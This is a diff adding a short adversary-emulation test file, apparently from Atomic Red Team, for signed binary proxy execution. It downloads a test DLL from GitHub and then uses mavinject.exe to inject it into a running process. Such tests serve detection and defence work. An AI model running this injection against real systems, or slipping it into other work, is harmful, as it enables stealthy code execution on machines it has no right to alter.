@@ -1,0 +1,13 @@
+#TechniqueName: Signed Binary Proxy Execution
+#AtomicTestName: mavinject - Inject DLL into running process
+#Description: Injects arbitrary DLL into running process specified by process ID. Requires Windows 10.&
+#Language: cmd
+
+#get_prereq_commands
+New-Item -Type Directory (split-path PathToAtomicsFolder\T1218\src\x64\T1218.dll) -ErrorAction ignore | Out-Null
+Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/x64/T1218.dll" -OutFile "PathToAtomicsFolder\T1218\src\x64\T1218.dll"
+
+
+#commands
+mavinject.exe 1000 /INJECTRUNNING PathToAtomicsFolder\T1218\src\x64\T1218.dll
+
